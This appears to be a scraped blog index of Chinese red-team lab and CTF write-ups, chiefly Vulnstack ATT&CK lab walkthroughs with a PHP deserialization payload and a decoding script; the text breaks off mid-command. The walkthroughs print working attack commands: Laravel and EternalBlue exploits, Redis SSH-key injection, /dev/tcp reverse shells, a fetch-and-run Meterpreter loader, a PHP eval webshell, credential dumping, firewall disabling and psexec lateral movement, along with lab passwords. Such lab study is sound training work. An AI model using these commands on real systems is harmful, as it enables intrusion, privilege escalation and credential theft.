unserialize($_GET['data']);&#125;else&#123;    $demo=new Demo;&#125;\n\npayload\ndata=O:4:&quot;Demo&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;user&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n原生类利用\nhttp://www.wangqingzheng.com/anquanke/82/238482.html\n","categories":["CTF","比赛复盘"],"tags":["反序列化","RSA"]},{"title":"ATK&CK红队评估实战靶场（七）","url":"/2023/01/05/ATK&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/","content":"前言靶机详细信息\nhttp://vulnstack.qiyuanxuetang.net/vuln/detail/9/\n\n域用户账户和密码Administrator：Whoami2021whoami：Whoami2021bunny：Bunny2021moretz：Moretz2021Ubuntu 1：web：web2021Ubuntu 2：ubuntu：ubuntu通达OA账户：admin：admin657260\n\n环境搭建拓扑图\n\n\n\n\n\n\n\n首先，创建一张VMnet1的网卡，将网段设置为192.168.1.0，用于模拟外网环境，同时将外网靶机Ubuntu(web1)和kali 应用该网卡。\n\n\n\n\n\n\n\n然后再按照以下文档来配置\n\n环境配置在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为192.168.52.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24：\n将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。\nDMZ区域：\n\n给Ubuntu (Web 1) 配置了两个网卡，一个配置VMnet1可以对外提供服务；一个连接在VMnet8上连通第二层网络。\n\n第二层网络区域：\n\n给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网络，一个连接在VMnet14上连通第三层网络。\n\n第三次网络区域：\n\n给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第三层网络。\n\n服务配置靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应的主机上启动靶机服务：\nDMZ区的 Ubuntu 需要启动redis和nginx服务：\n\nsudo redis-server /etc/redis.conf\nsudo /usr/sbin/nginx -c /etc/nginx/nginx.conf\nsudo iptables -F\n\n第二层网络的 Ubuntu需要启动docker容器：\n\nsudo service docker start\nsudo docker start 8e172820ac78\n\n第三层网络的 Windows 7 （PC 1）需要启动通达OA：\n\nC:\\MYOA\\bin\\AutoConfig.exe\n\n\n\n\n攻入内网：web1kali的IP：192.168.1.6\n主机发现nmap -sn 192.168.1.1/24\n\n\n\n\n\n\n\n\n得到第一层靶机的IP192.168.1.5\n端口扫描sudo nmap -sS -Pn -sV -v -p 1-65535 192.168.1.5\n\n\n\n\n\n\n\n\n开放了22、80、81、6379端口\n访问80\n\n\n\n\n\n\n\n访问 81\n\n\n\n\n\n\n\n可从页面中得到 站点的指纹 Laravel v8.29.0\n通过搜索引擎，可以得知，该版本存在CVE-2021-3129\n漏洞利用：CVE-2021-3129 phar反序列化首先下载 CVE-2021-3129利用工具\nhttps://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP\n\n然后执行 \npython3 .\\laravel-CVE-2021-3129-EXP.py &apos;http://192.168.1.5:81&apos;\n\n\n\n\n\n\n\n\n注意 url参数后面不能跟/，否则会没有返回结果 。\n利用脚本已经成功写入了哥斯拉的木马，但是这里用3.0以上的版本去连接会失败，我用的是2.96。\n\n\n\n\n\n\n\n\n\n\n连接成功，方便后续使用。\nRedis未授权漏洞发现目标主机开启了6379端口，尝试使用redis-cli进行连接\nredis-cli -h 192.168.1.5\n\n\n\n\n\n\n\n\n无需密码，直接连接成功，存在redis未授权漏洞\n尝试通过 redis 写 ssh 公钥，然后使用私钥去连接。\nredis  写入 ssh 公钥 getshell首先在kali中生成公钥\nssh-keygen -t rsa\n\n\n\n\n\n\n\n\n将公钥导入1.txt 文件中\n(echo -e &quot;\\n\\n&quot;; cat /home/kali/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; 1.txt\n\n将1.txt 文件内容写入目标主机的redis缓冲中\ncat 1.txt | redis-cli -h 192.168.1.5 -p 6379 -x set 1\n\n\n\n\n\n\n\n\n在redis中操作\nredis-cli -h 192.168.1.5get 1config set dir /root/.ssh                #设置redis的备份路径为/root/.ssh/config set dbfilename authorized_keys    #设置保存文件名为authorized_keyssave                                     #将数据保存在目标服务器硬盘上\n\n\n\n\n\n\n\n\nssh连接\nssh -i /home/kali/.ssh/id_rsa root@192.168.1.5\n\n\n\n\n\n\n\n\n成功连接上，并且拿到了靶机root权限。\n主机信息收集ifconfig\n\n\n\n\n\n\n\n\n发现内网网段192.168.52.0\n查看系统版本\nuname -a\n\n\n\n\n\n\n\n\n上传64位fscan扫描内网\n使用 scp\nscp -i /home/kali/.ssh/id_rsa /home/kali/Desktop/fscan/fscan_amd64 root@192.168.1.5:/tmp\n\n\n\n\n\n\n\n\n./fscan_amd64 -h 192.168.52.1/24\n\n(icmp) Target 192.168.52.10   is alive(icmp) Target 192.168.52.2    is alive(icmp) Target 192.168.52.20   is alive(icmp) Target 192.168.52.30   is alive[*] Icmp alive hosts len is: 4192.168.52.10:22 open192.168.52.20:8000 open192.168.52.30:8080 open192.168.52.10:6379 open192.168.52.30:139 open192.168.52.30:445 open192.168.52.20:22 open192.168.52.30:135 open192.168.52.10:81 open192.168.52.10:80 open[*] alive ports len is: 11start vulscan[*] WebTitle: http://192.168.52.10      code:502 len:584    title:502 Bad Gateway[+] Redis:192.168.52.10:6379 unauthorized file:/home/web/dump.rdb[+] Redis:192.168.52.10:6379 like can write /root/.ssh/[+] Redis:192.168.52.10:6379 like can write /var/spool/cron/[*] NetBios: 192.168.52.30   PC1.whoamianony.org                 Windows 7 Professional 7601 Service Pack 1 [+] 192.168.52.30       MS17-010        (Windows 7 Professional 7601 Service Pack 1)[*] WebTitle: http://192.168.52.30:8080 code:200 len:10065  title:通达OA网络智能办公系统[+] InfoScan:http://192.168.52.30:8080 [通达OA] [+] http://192.168.52.30:8080 tongda-user-session-disclosure [*] WebTitle: http://192.168.52.10:81   code:200 len:17474  title:Laravel[*] WebTitle: http://192.168.52.20:8000 code:200 len:17474  title:Laravel[+] InfoScan:http://192.168.52.20:8000 [Laravel] [+] InfoScan:http://192.168.52.10:81   [Laravel] [+] http://192.168.52.30:8080 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload [+] http://192.168.52.20:8000 poc-yaml-laravel-cve-2021-3129 [+] http://192.168.52.10:81 poc-yaml-laravel-cve-2021-3129\n\n通过扫描结果可以知道存活了四个ip，其中192.168.52.2为网关，192.168.52.10为当前靶机，另一台靶机192.168.52.20，并且开放了8000、22端口，通过查看当前靶机的nginx配置，可发现，当前靶机开放的81端口就是192.168.52.20的8000端口，通过nginx反向代理到了当前靶机。\n还有一台为192.168.52.30，开放了8080、139、135、445端口，操作系统为windows7，并且存在MS17-010和tongda-oa-v11.9-api.ali.php-fileupload的漏洞。\ncat /etc/nginx/conf.d/81.conf\n\n\n\n\n\n\n\n\n在前面，我们已经通过CVE-2021-3129漏洞拿到192.168.52.20webshell权限。\n接下来，通过该webshell继续向内网渗透。\n二层内网渗透：web2方便后续操作，首先在哥斯拉中执行反弹shell命令，将shell反弹到Kali中\nkali监听\nnc -lvnp 4444\n\n\n\n\n\n\n\n\n 哥斯拉中执行\nbash -c &apos;exec bash -i &amp;&gt;/dev/tcp/192.168.1.6/4444 &lt;&amp;1&apos;\n\n\n\n\n\n\n\n\n得到\n\n\n\n\n\n\n\n提权查看系统版本\nuname -a\n\n\n\n\n\n\n\n\nLinux内核版本Linux version 4.4.0-142-generic，脏牛提权漏洞存在于Linux内核 &gt;= 2.6.22，当前靶机不存在脏牛提权漏洞。\n接下来\n尝试查看具有suid特殊权限的文件来进行提权\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n\n\n\n\n\n\n\n发现一个可疑文件 shell\n\n\n\n\n\n\n\n执行shell，发现其实就是以root用户调用了ps命令。\n提权思路，如果我们构造一个可以反弹shell的ps文件，然后再改变$PATH环境变量，让shell执行我们构造的ps，不就可以拿到root权限了嘛。\n环境变量劫持提权首先创建一个可以反弹shell的ps文件，因为我们通过redis写ssh公钥，已经拿到了Ubuntu靶机的权限，并且Ubuntu靶机与当前正在攻击的靶机在同以网段，所直接将shell反弹到Ubuntu靶机上。\n在/tmp目录下执行\necho &quot;bash -c &apos;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/4444 &lt;&amp;1&apos;&quot; &gt; ps\n\n\n\n\n\n\n\n\n赋予可执行权限\nchmod 777 ps\n\n查看环境变量\necho $PATH\n\n\n\n\n\n\n\n\n将tmp目录添加到环境变量中\nexport PATH=/tmp:$PATH\n\n\n\n\n\n\n\n\n在Ubuntu靶机中进行监听\nnc -lnvp 4444\n\n\n\n\n\n\n\n\n回到当前靶机中执行\n./shell\n\n\n\n\n\n\n\n\n左边是监听，右边执行，成功提权到root。\nDocker特权逃逸发现好多命令根本无法执行，查看是不是在docker中\nls -alh /.dockerenvcat /proc/1/cgroup\n\n\n\n\n\n\n\n\n发现存在于Docker环境中\n\n如果是通过特权模式启动容器，就可以获得大量设备文件的访问权限，因为管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。\n\n利用方式\n创建一个目录用于挂载\nmkdir /tmp/test\n\n挂载\nmount /dev/sda1 /tmp/test\n\n\n\n\n\n\n\n\n成功\nssh密钥写入首先生成密钥\nssh-keygen -f rsa\n\n\n\n\n\n\n\n\n接下来\n在Ubuntu1使用python 开启 http服务监听\npython3 -m http.server\n\n 在ubuntu2中\n先进入到/tmp/test/home/ubuntu/.ssh目录下，然后使用curl下载rsa.pub公钥\ncd /tmp/test/home/ubuntu/.sshcurl -O http://192.168.52.10:8000/rsa.pub\n\n\n\n\n\n\n\n\n将rsa.pub重命名为authorized_keys\nmv rsa.pub authorized_keys\n\n然后回到Ubuntu1中，在刚刚生成的rsa目录下连接\nssh -i rsa ubuntu@192.168.52.20\n\n\n\n\n\n\n\n\n成功连接。\n权限维持到目前为止，已经成功拿下web1和web2两台靶机了，接下来使用MSF对两台靶机进行权限维持，方便后续渗透内网。\n上线web1靶机use exploit/multi/script/web_deliveryset target 7set payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.1.6set lport 6789exploit\n\n\n\n\n\n\n\n\n得到一条命令\nwget -qO pwkzg9Z9 --no-check-certificate http://192.168.1.6:8080/79LajMacnMhyY5R; chmod +x pwkzg9Z9; ./pwkzg9Z9&amp; disown\n\n将该命令放在web1的shell中执行\n\n\n\n\n\n\n\n成功上线web1靶机\n\n\n\n\n\n\n\n添加路由route add 192.168.52.0 255.255.255.0 1\n\n\n\n\n\n\n\n\n上线web2靶机生成Linux 反弹shell\nmsfvenom -p linux/x64/meterpreter/bind_tcp lport=9988 -f elf &gt; shell9988\n\n将 shell9988 上传至 web1靶机中\nupload /home/kali/shell9988 /tmp\n\n\n\n\n\n\n\n\nMSF开启监听\nuse exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 192.168.52.20set lport 9988exploit\n\n然后将生成的木马上传至web2中执行\n在tmp目录下用python开启http监听\npython3 -m http.server\n\n在web2中下载shell9988并执行\n\n\n\n\n\n\n\n\n\n\n\n\n\nMSF中成功上线\n二层内网渗透：pc1[*] NetBios: 192.168.52.30   PC1.whoamianony.org                 Windows 7 Professional 7601 Service Pack 1 [+] 192.168.52.30       MS17-010        (Windows 7 Professional 7601 Service Pack 1)[*] WebTitle: http://192.168.52.30:8080 code:200 len:10065  title:通达OA网络智能办公系统[+] InfoScan:http://192.168.52.30:8080 [通达OA] [+] http://192.168.52.30:8080 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload\n\n在通过fscan对内网网段192.168.52.0进行扫描的时候，还发现一台IP地址为192.168.52.30的windows主机，并且存在永恒之蓝和通达的文件上传漏洞，MSF已经添加了路由，所以我们在Kali上的请求能够到达192.168.52.0网段，接下来尝试通过该漏洞拿到权限。\n永恒之蓝漏洞利用（失败）use exploit/windows/smb/ms17_010_eternalblueset rhosts 192.168.52.30set payload windows/x64/meterpreter/bind_tcp\n\n\n\n\n\n\n\n\n但是靶机蓝屏了（尝试多次依旧如此）\n\n\n\n\n\n\n\n换一种方式。\n通达 api.ali.php-fileupload 漏洞利用我们最开始在MSF上开起了socks5代理服务，这里直接在物理机上挂代理，然后访问8080端口\n\n\n\n\n\n\n\n访问 192.168.52.30:8080\n\n\n\n\n\n\n\n通过扫描得知存在 tongda-oa-v11.9-api.ali.php-fileupload漏洞\n接下来使用LiqunKit_1.5 设置代理直接对漏洞进行利用\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n使用蚁剑连接（需要配置代理）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n拿到的直接就是system权限\n权限维持接下来将该靶机上线到MSF中\n首先创建shell\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8899 -f exe &gt; 8899.exe\n\nMSF开启监听\nuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset rhost 192.168.52.30set LPORT 8899\n\n将shell上传到靶机中\n\n\n\n\n\n\n\n在命令终端上执行\n\n\n\n\n\n\n\nMSF收到shell\n\n\n\n\n\n\n\n主机信息收集查看网卡信息ipconfig /all\n\n发现得到域名whoamianony.ory\n\n\n\n\n\n\n\n发现内网网段 192.168.93.0，当前靶机ip为192.168.93.20\n\n\n\n\n\n\n\n查看域内所有用户列表\n收集域信息 需要把进程迁移到域用户执行的进程中\n\nnet group /domain\n\n\n\n\n\n\n\n\n查看域成员计算机列表net group &quot;Domain Computers&quot; /domain\n\n\n\n\n\n\n\n\n查看所有域用户net group &quot;Domain Users&quot; /domain\n\n\n\n\n\n\n\n\n查看域管理员用户net group &quot;domain admins&quot; /domain\n\n\n\n\n\n\n\n\n收集用户登录口令load kiwicreds_all\n\n\n\n\n\n\n\n\n\n\n\n得到\n用户：bunny域：WHOAMIANONYNTLM：cc567d5556030b7356ee4915ff098c8f密码：Bunny2021用户：Administrator域：WHOAMIANONYNTLM：cc567d5556030b7356ee4915ff098c8f密码：Whoami2021\n\n内网信息收集直接上传fscan\nupload /home/kali/Desktop/fscan/fscan64.exe c:/\n\n\n\n\n\n\n\n\n开扫\nfscan64.exe -h 192.168.93.1/24\n\n(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.20   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.40   is alive[*] Icmp alive hosts len is: 4192.168.93.40:139 open192.168.93.30:139 open192.168.93.10:8000 open192.168.93.20:8080 open192.168.93.40:445 open192.168.93.30:445 open192.168.93.20:445 open192.168.93.20:139 open192.168.93.40:135 open192.168.93.30:135 open192.168.93.20:135 open192.168.93.10:22 open192.168.93.30:88 open[*] alive ports len is: 14start vulscan[+] 192.168.93.20       MS17-010        (Windows 7 Professional 7601 Service Pack 1)[*] WebTitle: http://192.168.93.20:8080 code:200 len:10065  title:通达OA网络智能办公系统[*] NetInfo:[*]192.168.93.30   [-&gt;]DC   [-&gt;]192.168.93.30[+] 192.168.93.40       MS17-010        (Windows 7 Professional 7601 Service Pack 1)[+] InfoScan:http://192.168.93.20:8080 [通达OA] [*] NetBios: 192.168.93.30   [+]DC DC.whoamianony.org            Windows Server 2012 R2 Datacenter 9600 [+] 192.168.93.30       MS17-010        (Windows Server 2012 R2 Datacenter 9600)[*] NetBios: 192.168.93.40   PC2.whoamianony.org                 Windows 7 Professional 7601 Service Pack 1 [+] http://192.168.93.20:8080 tongda-user-session-disclosure [*] WebTitle: http://192.168.93.10:8000 code:200 len:17474  title:Laravel[+] InfoScan:http://192.168.93.10:8000 [Laravel] [+] http://192.168.93.20:8080 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload [+] http://192.168.93.10:8000 poc-yaml-laravel-cve-2021-3129\n\n通过fscan扫描结果可以知道，内网存活四台靶机，且192.168.93.10和192.168.93.20 都已经被攻陷，192.168.93.30为域控，存在MS17-010漏洞，操作系统为Windows Server 2012 R2，域成员服务器192.168.93.40，也存在MS17-010漏洞，操作系统为Windows 7 Professional 7601 Service Pack 1。\n三层内网渗透准备我们已经拿下了二层网络的所有靶机，接下来，我们需要在二层的基础上拿下三层的所有靶机，通过上传fscan扫描出三层靶机都存在永恒之蓝漏洞，可以使用MSF自带的添加路由功能来使MSF的数据包能达到192.168.93.0网段，但是利用过程中，极其不稳定很不容易上线，所以，这里通过frp工具来实现一个二层代理。\n首先在kali中配置 frps.ini\n[common]bind_port = 7455\n\n\n\n\n\n\n\n\n在web1靶机中 分别配置 frpc.ini和frps.ini\nfrpc.ini\n[common]server_addr = 192.168.1.7server_port = 7455[http_proxy]type = tcplocal_ip = 192.168.52.10local_port = 46075       remote_port = 46075\n\nfrps.ini\n[common]Bind_addr = 192.168.52.10bind_port = 7455\n\n\n\n\n\n\n\n\n在web2靶机 配置 frpc.ini\n[common]server_addr = 192.168.52.10server_port = 7455[plugin_socks]type = tcpremote_port = 46075plugin = socks5\n\n\n\n\n\n\n\n\n最后代理地址\nsocks5:192.168.1.7:46075\n\n通过 proxychains4+nmap扫描 192.168.93.30的445端口，看是否成功\nproxychains4 nmap -p 445 192.168.93.30\n\n\n\n\n\n\n\n\n成功\n三层内网渗透：pc2永恒之蓝漏洞利用接下来，另起一个MSF\nuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpset RHOSTS 192.168.93.30setg proxies socks5:192.168.1.7:46075\n\n\n\n\n\n\n\n\n拿下\n信息收集load kiwicreds_all\n\n\n\n\n\n\n\n\n抓取到了域用户moretz的密码\nmoretz:Moretz2021\n\n三层内网渗透：域控服务器永恒之蓝漏洞利用（失败）尝试进行永恒之蓝漏洞利用\n\n\n\n\n\n\n\n利用失败了，猜测应该因为开启了防火墙。\n在之前，我们收集到了域管理员用户的账号密码administrator:Whoami2021\n接下来，通过wmiexec.py 执行命令来关闭防火墙\nproxychains4 python3 wmiexec.py &quot;administrator:Whoami2021@192.168.93.30&quot;netsh advfirewall set allprofiles state off\n\n\n\n\n\n\n\n\n这里虽然有报错，但是已经是成功关闭了的。\n再次尝试利用\n\n\n\n\n\n\n\n还是无法利用，经过多次尝试，会导致域控服务器重启。\n利用psexec传递拿下DCuse exploit/windows/smb/psexecset rhosts 192.168.93.30set smbpass Whoami2021set smbuser Administratorset payload windows/meterpreter/bind_tcpexploit\n\n\n\n\n\n\n\n\n成功拿下域控\n最后，所有靶机的 sessions\n\n\n\n\n\n\n\n\n\n\n相关知识点Linux 反弹shell 命令bash -c &apos;exec bash -i &amp;&gt;/dev/tcp/192.168.1.9/8888 &lt;&amp;1&apos;\n\n用python获得一个交互式shellpython -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;\n\n参考文章https://www.cnblogs.com/chen-w/p/16194101.html\nhttps://blog.csdn.net/weixin_62334252/article/details/125384701\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"9月Tamil CTF 2021","url":"/2021/09/27/9%E6%9C%88Tamil%20CTF%202021/","content":"Web-CringeNcoder分析过程就是一道编码解码题，没什么难度，刚开始以为是sql，后边又以为是模板注入，最后访问/flag，就明白了这道题的用意。\n解题脚本dict = &#123;\"cringe\":\"a\", \"cr1nge\":\"b\",\"cRinge\":'c',\"crIng3\":'d',\"cRimG3\":'e',\"cR1Ng3e\":'f',\"criNgee\":'g',\"CRINGE\":'h',\"crinGE\":'i',\"ccR1nge\":'j',\"CriNGE\":'k',\"cRINGe\":'l',\"cr1ngE\":'m',\"cringE\":'n',\"CRIng3\":'o',\"Cr1nGe\":'p',\"cR1nnge\":'q',\"cR1Ng3\":'r',\"CrInGe\":'s',\"cRingE\":'t',\"cR1NGE\":'u',\"CRiNg3\":'v',\"CRINGe\":'w',\"CR1NGe\":'x',\"cring3\":'y',\"CRIMNGE\":'z',\"crinG3\":1, \"cRInge\":2,\"cRinG3\":3 ,\"criNG3\":4 ,\"cr1NG3\":5 ,\"crinGe\":6,\"cRiNge\":7, \"CrInGE\":8 ,\"CRinGE\":9,\"cRInGE\":0&#125;str1 = \"cR1Ng3e crinG3 cringE cringe cRINGe cRINGe cring3 crinG3 cringE cringE cRinG3 Cr1nGe cRimG3 criNG3 cRinge cRimG3 cringe cR1Ng3e cRiNge cRinG3 cR1Ng3 CrInGe cRInGE cr1ngE criNG3 cringE cring3 cRinge cR1Ng3 crinGE cringE criNgee cRinG3 CrInGe\"list = str1.split(' ')s = ''for key in list:    s += str(dict[key])print(\"TamilCTF&#123;\"+s+\"&#125;\")\n\n","categories":["CTF","比赛复盘"],"tags":["编码解码"]},{"title":"ATK&CK红队评估实战靶场（一）","url":"/2022/12/25/ATK&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/","content":"前言靶机详细信息\nhttp://vulnstack.qiyuanxuetang.net/vuln/detail/2/\n\n环境搭建环境拓扑图\n\n\n\n\n\n\n\n攻击机kali  和 靶机都通过 Vmware 进行部署。\n添加虚拟网卡靶机内网设置的都是静态id，网段是在192.168.52.0，所以需要先添加一个虚拟网卡，将子网地址设置为192.168.52.0，用来管理靶机内网，我这里创建的是Vmnet2。\n\n\n\n\n\n\n\n通过拓扑图可以知道，kali 、物理机和靶机的win7的外网网卡在 172.20.10.0，这个网段是通过Vmnet8虚拟出来的， 而 win7的内网网卡 、域控服务器 windows server 2008和win 2k3 在 192.168.52.0这个网段。\n所以，这里只需要在vmware给kali 连接方式设置为Vmnet8，win7添加两张网卡，分别添加 vmnet8和vmnet2，其余靶机添加 vmnet2即可。\n攻击机 kali\nIP: 172.20.10.128\n\nWEB服务器 windows 7\n外网IP：172.20.10.156内网IP：192.168.52.143d\n\n禁用PING检测\nIP：192.168.52.138\n\n域成员服务器 Win 2k3\nIP：192.168.52.141\n\n外网打点：web服务器信息收集主机发现首先，我们需要知道那些ip存活，扫描C段，\nsudo netdiscover -i eth0 -r 172.20.10.0/24# -i 指定网卡# -r 指定网段\n\n\n\n\n\n\n\n\n端口扫描通过扫描c段，我们发现了 172.20.10.156 主机存活，接下来对其进行端口扫描\nsudo nmap -sS -Pn -p 1-65535 -sV -n 172.20.10.156# -sS SYN扫描# -Pn 跳过主机发现（适合禁用PING检测的时候对目标进行端口扫描）# -p  指定端口（指定全端口的时候 速度会比较慢）# -sV  探测服务版本信息# -n 不做dns解析\n\n\n\n\n\n\n\n\n通过nmap扫描结果，可以知道目标主机开放了 80 和 3306端口，分别对应 http服务和mysql服务\n接下来访问目标主机的http服务\nhttp://172.20.10.156/\n\n\n\n\n\n\n\n\n一个phpstudy的展示页面，泄露了一些服务器的信息。\n目录扫描网页比较简陋，但是泄露了大量的服务器隐私信息，接下来使用 dirsearch工具扫一下目录\npython3 .\\dirsearch.py -u &quot;http://172.20.10.156/&quot;\n\n\n\n\n\n\n\n\n\n\n\n发现网站目录下存在多套网站系统 ycms 和 phpmyadmin，phpmyadmin 可能会存在历史漏洞，接下来访问phpmyadmin看看\n\n\n\n\n\n\n\n漏洞利用：弱口令尝试弱口令 root/root\n\n\n\n\n\n\n\n成功进行后台管理页面，但是没有发现phpmyadmin的具体版本号。\n不过可以结合phpstudy的展示页面泄露的网站绝对路径，尝试使用phpmyadmin在线执行sql语句的功能进行sql写马。\n漏洞利用：myql  写马（失败）Select &apos;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&apos; into outfile &apos;C:/phpStudy/WWW/cmd.php&apos;;\n\n\n\n\n\n\n\n\n报错了，这是因为限制了导入与导出的目录权限。只允许在规定的目录下才能导入。\n查看变量secure-file-priv 的值\nshow global variables like &apos;%secure%&apos;;\n\n\n\n\n\n\n\n\n值为 NULL\n（1）NULL，表示禁止。（2）如果value值有文件夹目录，则表示只允许该目录下文件（PS：测试子目录也不行）。（3）如果为空，则表示不限制目录。如果为 NULL 则只读无法修改\n\n那就换一种方式\n漏洞利用：全局日志写入shell查看全局变量general_logshow global variables like &apos;%general_%&apos;;\n\n\n\n\n\n\n\n\n开启全局日志并修改日志保存位置set global general_log=on;set global general_log_file=&apos;C:/phpStudy/WWW/cmd.php&apos;;\n\n\n\n\n\n\n\n\n\n\n\n将一句话木马写入日志select &quot;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&quot;\n\n\n\n\n\n\n\n\n访问\nhttp://172.20.10.156/cmd.php\n\n\n\n\n\n\n\n\n成功写入，使用蚁剑连接\n\n\n\n\n\n\n\n成功拿到一个shell\n权限维持使用cs进行权限维持我们这里使用cobalt strike 进行上线\n首先，我们在kali中启动一个 cs服务端\nsudo ./teamserver 172.20.10.128 fany\n\n\n\n\n\n\n\n\n然后启动一个客户端，并连接\njava -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar\n\n\n\n\n\n\n\n\n创建一个监听器\n\n\n\n\n\n\n\n生成一个 powershell 的payload\n\n\n\n\n\n\n\n得到一个 txt文件\n\n\n\n\n\n\n\n接下来在蚁剑的虚拟终端中执行 文件中这一串payload\n\n\n\n\n\n\n\n接下来回到 cs 客户端中，发现成功上线\n\n\n\n\n\n\n\n提权接下来使用cs自带的工具进行提权\n\n\n\n\n\n\n\n选择刚刚创建的监听器\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成功提权到system，已经成功拿下这台靶机。\n我们还需要打入内网，接下来对该主机进行信息收集\n主机信息收集通过查看网卡信息，发现内网网段\n\n\n\n\n\n\n\n内网网段192.168.52.0\n\n\n\n\n\n\n\n\n收集域信息（由于靶机上的phpstudy启动报错，http服务无法启动，无法通过蚁剑收集域信息，所以这部分信息通过msf的shell收集）域\ngod.org\n\n\n\n\n\n\n\n\n通过域名，我们可以拿到域控的IP为 192.168.52.138\n查看域内所有用户列表\nnet group /domain\n\n\n\n\n\n\n\n\n查看域成员计算机列表\nnet group &quot;domain computers&quot; /domain\n\n\n\n\n\n\n\n\n查看域管理员用户\nnet group &quot;domain admins&quot; /domain\n\n\n\n\n\n\n\n\n主机密码收集\n\n\n\n\n\n\n\n\n\n\n\n\n\n得到Administrator的密码为hongrisec@2019\n开启远程桌面登录注册表开启3389端口REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n\n\n\n\n\n\n\n成功开启，结合刚刚获取到的用户名密码，进行远程登录\n\n\n\n\n\n\n\n发现连不上，可能是防火墙开启的原因，关闭防火墙\nnetsh advfirewall set allprofiles state off\n\n\n\n\n\n\n\n\n再次连接成功\n\n\n\n\n\n\n\n在桌面发现nmap工具，可以使用nmap对内网网段进行主机发现，也可以使用其他工具，这里我们使用fscan。\n内网信息收集已经可以远程登录到win7这台靶机，接下来通过该靶机上传一个fscan对内网网段进行扫描。\nfscan.exe -h 192.168.52.1/24\n\n\n\n\n\n\n\n\n通过fscan扫描，可以得知，除当前靶机外的ip地址 192.168.52.143外 还存在另外两个ip地址\n192.168.52.138 192.168.52.141\n\nfscan检测出这两个ip 都存在 ms17-010漏洞，可以通过msf的漏洞利用模块进行进一步利用，但是我们 kali 和这两台靶机的不在同一个网段，路由不可达，所以，我们需要通过win7靶机做一个跳板。\n思路：通过cs派生一个shell给 msf，然后通过msf 添加一条 可通过 192.168.52.0网段的路由，最后通过 msf的 ms17-010漏洞利用模块进行利用。\n横向移动准备cobalt strike 派生shell 给 msf（失败）首先在msf上配置一个监听\nuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 9999run -j\n\n\n\n\n\n\n\n\n然后在 cobalt strike 上创建一个IP和端口跟MSF一样的监听\n\n\n\n\n\n\n\n\n\n\n选择刚刚的创建的监听器\n\n\n\n\n\n几秒钟后 msf 获取到一个shell\n\n\n\n\n\n\n\n注意这里通过CS派生出来的shell存在一个问题，隔几秒钟之后就会断掉。\n\n\n\n\n\n\n\n手动上线通过CS派生出来的shell很容易掉，所以这里我们直接生成一个exe的木马，上传到win7 上执行\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.10.128 LPORT=4455 -f exe &gt; system.exe\n\n\n\n\n\n\n\n\n接下来 在msf开启监听\nuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 4455exploit -j\n\n\n\n\n\n\n\n\n将生成的system.exe拷贝到 靶机 win 7 中执行\n成功上线\n\n\n\n\n\n\n\n添加路由route add 192.168.52.0 255.255.255.0 2\n\n\n\n\n\n\n\n\n内网渗透：域控服务器通过前面的准备，我们的MSF的流量已经可以通向192.168.52.0这个网段。\n接下来，我们对 52.138 和 52.141 这两个ip 进行MS17-010漏洞利用，在对域god.org进行解析的时候，发现对应的ip为192.168.52.138，此IP很可能是域控。\n永恒之蓝漏洞利用接下来，使用MSF进行利用\n搜索ms17-010利用模块\nsearch ms17-010\n\n\n\n\n\n\n\n\n不确定目标靶机的版本信息，先使用auxiliary/scanner/smb/smb_ms17_010 检测一下\n\n\n\n\n\n\n\n可以确定存在 MS17-010漏洞，靶机的操作系统为 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 \n使用 exploit/windows/smb/ms17_010_eternalblue 模块进行利用\npayload windows/x64/meterpreter/bind_tcp\n\n\n\n\n\n\n\n利用失败了\n使用 exploit/windows/smb/ms17_010_psexec模块\npayload 